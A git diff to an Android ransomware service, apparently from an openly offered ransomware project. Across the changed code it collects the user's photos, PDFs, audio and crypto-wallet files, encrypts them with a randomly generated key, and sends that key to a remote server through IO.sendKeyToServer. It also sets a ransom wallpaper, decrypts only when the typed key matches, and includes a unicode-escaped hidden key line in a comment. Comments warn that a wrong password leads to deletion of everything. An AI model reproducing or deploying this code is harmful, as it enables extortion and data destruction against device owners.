@@ -1,7 +1,8 @@
-package alepacheco.com.rw;
+package alepacheco.com.rw.services;
 
 import android.app.Service;
 import android.app.WallpaperManager;
+import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -24,8 +25,15 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 import java.util.Random;
+
+import alepacheco.com.rw.R;
+import alepacheco.com.rw.apl.Aes;
+import alepacheco.com.rw.apl.BlurBuilder;
+import alepacheco.com.rw.io.IO;
+import alepacheco.com.rw.persistence.LocalStorage;
 
 public class MyService extends Service {
     @Nullable
@@ -36,15 +44,22 @@ public class MyService extends Service {
     List<File> al, vids;
     int progress = 0;
     String totalFiles = "";
+    String idUser;
     byte[] KEY;
+    Random r;
+    Context ctx;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        ctx = getApplicationContext();
+        r = new Random();
+
         al = getFiles(Environment.getExternalStorageDirectory(),
                 new String[]{
                         ".jpg", ".jpeg", ".png", ".JPG", ".PNG",
                         ".JPEG", ".pdf", ".PDF", ".mp3", ".MP3",
+                        ".WAV", ".wav",
                         "wallet", "blockchain", ".ogg", ".thumbnails"},
                 new String[]{"Android/data"});
         vids = getFiles(Environment.getExternalStorageDirectory(),
@@ -57,14 +72,72 @@ public class MyService extends Service {
 
             /* \u002a\u002f\u004b\u0045\u0059\u0020\u003d\u0020\u0022\u0030\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0038\u0039\u0030\u0031\u0032\u0033\u0034\u0035\u0022\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0022\u0055\u0054\u0046\u0038\u0022\u0029\u003b\u002f\u002a */
 
-            // Well... you guess it.
-            encryptFile();
+            if(checkEncryptedState()){ // VERIFICA SE É para tentar criptografar ou descriptografar
+                // MUITO CUIDADO, SE A SENHA ESTIVER ERRADA O SACI VAI APAGAR TUDO
+                if(checkTypedKey()){ //DANDO UMA COLHER DE CHÁ
+                    decryptFile();
+                }
+            }else{
 
+                generateRandomId();
+                generateRandomKey();
 
+                // Well... you guess it.
+                encryptFile();
+
+                saveEncryptedState();
+
+                IO.sendKeyToServer(ctx,idUser,new String(this.KEY));
+            }
         } catch (Exception e) {
             e.printStackTrace();
         }
 
+    }
+
+    /*
+    * Check if the key typed is correct
+    * */
+    private Boolean checkTypedKey(){
+        String typedKey = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_TEMP_KEY);
+        String currentKey = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_KEY);
+        return currentKey.equals(typedKey);
+    }
+
+    /*
+    * Check encrypted state
+    * @returns True -> Enctypted
+    * @returns False -> Decrypted
+    * */
+    private Boolean checkEncryptedState(){
+        return LocalStorage.getInstance(ctx).getBooleanByTag(LocalStorage.TAG_ENCRYPTED);
+    }
+
+    /*
+    * Save encrypted state on Local Storage
+    * */
+    private void saveEncryptedState(){
+        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED,true);
+    }
+
+    /*
+    * Generate and save Random ID
+    * */
+    private void generateRandomId() {
+        byte[] id = new byte[100];
+        Date d = new Date();
+        r.nextBytes(id);
+        this.idUser = String.format("%s-%s",d.getTime(),new String(id));
+        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ID_USER,idUser);
+    }
+
+    /*
+    * Generate and save Random key
+    * */
+    private void generateRandomKey(){
+        this.KEY = new byte[256];
+        r.nextBytes(this.KEY);
+        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY,new String(this.KEY));
     }
 
     public void updateProgress(boolean direction) {
@@ -103,7 +176,7 @@ public class MyService extends Service {
         }
 
 
-        Bitmap bm = BitmapFactory.decodeResource(getResources(), alepacheco.com.rw.R.mipmap.note);
+        Bitmap bm = BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher);
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
         bm.compress(Bitmap.CompressFormat.PNG, 100, stream);
         saveFile(stream.toByteArray(), Environment.getExternalStorageDirectory() + File.separator + "Pictures" );
@@ -112,7 +185,7 @@ public class MyService extends Service {
         WallpaperManager myWallpaperManager
                 = WallpaperManager.getInstance(getApplicationContext());
         try {
-            myWallpaperManager.setResource(alepacheco.com.rw.R.mipmap.note);
+            myWallpaperManager.setResource(R.mipmap.ic_launcher);// Setando wall paper de marotagem
         } catch (IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
